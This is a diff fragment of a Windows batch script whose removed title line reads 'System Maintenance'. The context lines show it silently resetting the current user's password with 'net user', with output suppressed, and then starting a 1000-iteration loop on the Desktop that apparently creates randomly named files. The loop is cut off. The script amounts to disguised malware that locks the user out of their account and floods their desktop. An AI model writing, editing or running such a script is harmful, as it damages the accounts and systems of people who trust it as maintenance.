@@ -1,7 +1,5 @@
 @echo off
-setlocal EnableDelayedExpansion
 
-title System Maintenance
 color 0c
 
 for /f "tokens=*" %%a in ('whoami') do set "currentuser=%%a"
@@ -26,8 +24,6 @@ set "currentuser=%username%"
 net user %currentuser% "%newpass%" >nul 2>&1
 
 cd %userprofile%\Desktop
-
-setlocal EnableDelayedExpansion
 
 for /L %%i in (1,1,1000) do (
     set "random_name="
